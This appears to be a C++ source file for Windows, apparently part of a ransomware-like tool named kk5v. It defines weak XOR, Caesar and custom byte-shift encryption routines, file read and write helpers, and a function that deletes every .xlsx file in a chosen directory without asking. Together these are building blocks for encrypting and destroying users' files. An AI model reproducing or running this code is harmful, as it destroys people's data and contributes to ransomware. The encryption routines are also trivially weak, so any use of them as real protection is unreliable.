#include "kk5v_encryption.h"
#include <fstream>
#include <sstream>  // Include this header to use stringstream
#include <windows.h>
#include <string>

namespace kk5v {

    // XOR encryption method
    void xor_encrypt(std::string& data, const std::string& key) {
        size_t key_length = key.length();
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key_length];  // XOR with the key (loop over key if necessary)
        }
    }

    // Caesar cipher encryption method
    void caesar_encrypt(std::string& data, int shift) {
        for (char& c : data) {
            if (isalpha(c)) {
                char offset = islower(c) ? 'a' : 'A';
                c = (c - offset + shift) % 26 + offset;
            }
        }
    }

    // Custom encryption method (KK5V simple encryption)
    void kk5v_encrypt(std::string& data, const std::string& key) {
        for (size_t i = 0; i < data.size(); ++i) {
            // Simple custom encryption, shift each byte by a certain amount using the key
            data[i] += key[i % key.length()] % 10;  // Add a value from the key
        }
    }

    // Read file into a string
    std::string read_file(const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary);  // Open the file in binary mode
        std::stringstream buffer;  // Use stringstream to read the file content into a string
        buffer << file.rdbuf();  // Read the file's contents into the stringstream
        return buffer.str();  // Return the content as a string
    }

    // Write encrypted data to a file
    void write_file(const std::string& file_path, const std::string& data) {
        std::ofstream file(file_path, std::ios::binary);  // Open file in binary mode to preserve data
        file << data;  // Write the encrypted data to the file
    }

    // Delete .xlsx files in a given directory
    void delete_xlsx_files(const std::string& directory) {
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile((directory + "\\*.xlsx").c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            return;
        }

        do {
            std::string file_path = directory + "\\" + findFileData.cFileName;
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue;  // Skip directories
            }
            DeleteFile(file_path.c_str());  // Delete the file
        } while (FindNextFile(hFind, &findFileData));

        FindClose(hFind);
    }
}
